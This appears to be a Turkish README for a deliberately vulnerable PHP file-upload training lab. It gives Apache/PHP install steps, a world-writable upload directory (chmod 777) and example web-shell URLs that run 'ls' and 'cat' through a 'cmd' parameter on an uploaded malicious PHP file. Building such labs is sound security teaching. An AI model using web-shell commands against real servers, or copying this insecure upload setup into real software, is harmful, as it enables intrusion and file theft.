# File Upload Vulnerable Lab

Bu rehber, Apache2 üzerinde çalışan bir PHP tabanlı dosya yükleme zafiyeti laboratuvarı oluşturmanıza yardımcı olacaktır. Bu laboratuvar, zararlı dosyaların yüklenmesi ve çalıştırılması senaryosunu içermektedir.

## ⚠️ UYARI: Zararlı.php dosyası zararlı kod içermektedir ve güvenli olmayan sistemlerde ciddi güvenlik açıklarına neden olabilir. Bu işlemi yalnızca güvenli bir test ortamında gerçekleştirin.
**Dikkat:** Yüklenen dosyalardan ve bu rehberde yer alan adımlardan kaynaklanan her türlü sorumluluk size aittir. Lütfen bu laboratuvarı yalnızca yasal ve güvenli ortamlarda kullanın. Kötü niyetli kullanım ve zararlı faaliyetler yasaktır ve ciddi sonuçlara yol açabilir.


## Kurulum Adımları

### 1. Apache2 ve PHP'nin Kurulumu

Öncelikle, gerekli yazılımları güncelleyin ve kurun:

```bash
sudo apt update
sudo apt install apache2
sudo apt install php libapache2-mod-php

sudo systemctl start apache2
sudo systemctl enable apache2

cd /var/www/html
sudo mkdir fileupload  # Yüklenilen dosyaları bu dizine indiriniz (zararli.php hariç)
```
Dosyanın izinlerini açın 
sudo chmod 777 /var/www/html/fileupload/uploads

# Dosya Yükleme ve Zararlı Dosya Çalıştırma
Zararli.php dosyasını yükledikten sonra dosyayı yüklediğimiz dizine gidiyoruz.

```bash
http://localhost/fileupload/uploads/malicious.php?cmd=ls
http://localhost/fileupload/uploads/malicious.php?cmd=cat dosyaAdı
````
Gibi konutları kullanarak dosya dizininde istediğimiz gibi gezinebiliriz.
